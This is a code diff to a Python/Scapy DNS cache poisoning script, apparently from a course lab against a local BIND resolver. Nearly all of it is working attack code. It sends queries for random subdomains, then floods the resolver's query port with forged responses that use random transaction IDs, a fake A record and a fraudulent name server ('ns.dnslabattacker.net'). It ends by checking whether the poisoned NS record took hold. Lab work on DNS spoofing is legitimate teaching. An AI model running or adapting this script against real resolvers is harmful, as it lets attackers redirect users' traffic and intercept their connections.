@@ -11,7 +11,7 @@ from subprocess import call
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
 parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
-parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
+parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
 parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
 args = parser.parse_args()
 
@@ -20,11 +20,10 @@ my_ip = args.ip
 # your bind's port (DNS queries are send to this port)
 my_port = args.port
 # BIND's port
-dns_port = args.dns_port
+# dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
 
-dns_ip = "127.0.0.1"
 request_domain = "example.com"
 
 '''
@@ -61,7 +60,7 @@ def exampleSendDNSQuery():
 
 def sendDNSQuery(sock, query):
     dnsPacket = DNS(rd=1, qd=DNSQR(qname=query))
-    sendPacket(sock, dnsPacket, dns_ip, my_port)
+    sendPacket(sock, dnsPacket, my_ip, my_port)
     return
 
 """
@@ -79,14 +78,14 @@ def sendFakeReplies(query):
         z=0,
         qd=DNSQR(qname=query, qtype="A"),
         # answer with fraudulent ip (exp. rrname='www.slashdot.org.' type=A rclass=IN ttl=3560L rdata='66.35.250.151')
-        an=DNSRR(rrname=query, type="A", rclass="IN", ttl=3600, rdata="128.100.8.48"),
+        an=DNSRR(rrname=query, type="A", rclass="IN", ttl=3600, rdata="1.2.3.4"),
         # provide the fraudulent name server
         ns=DNSRR(rrname=request_domain, type="NS", rdata="ns.dnslabattacker.net")
     )
     print('Sending fake responses ...')
     for i in range(100):
         spoofReply[DNS].id = getRandomTXID()
-        sendPacket(sock, spoofReply, dns_ip, my_port)
+        sendPacket(sock, spoofReply, my_ip, my_query_port) # flood listening port
     return
 
 if __name__ == '__main__':
@@ -100,7 +99,6 @@ if __name__ == '__main__':
         print('Check for response from BIND')
         response = sock.recv(4096)
         response = DNS(response)
-        print(response.show())
-        if response[DNS].ns.rdata == 'ns.dnslabattacker.net':
+        if response[DNS].ns and response[DNS].ns.rdata == 'ns.dnslabattacker.net': # maybe use rcode for success/failure
             print("Success")
             break
